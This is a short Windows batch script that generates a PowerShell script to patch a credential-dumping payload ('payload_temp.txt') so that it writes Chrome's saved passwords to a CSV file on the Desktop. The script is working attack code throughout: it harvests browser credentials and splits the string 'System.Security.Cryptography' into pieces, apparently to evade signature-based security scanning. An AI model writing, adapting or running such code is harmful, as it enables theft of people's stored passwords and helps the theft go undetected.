@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
(
echo $ErrorActionPreference = 'SilentlyContinue'
echo $c = Get-Content 'payload_temp.txt' -Raw
echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
echo $c = $c -replace '\$arrExp ^^| Format-Table', ('$arrExp ^^| Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
echo $c = $c -replace '#requires -version 7', ''
echo $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
echo $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
echo Set-Content "run_chrome.ps1" -Value $c
) > "%WORK_DIR%\make_chrome.ps1"
type "%WORK_DIR%\make_chrome.ps1"
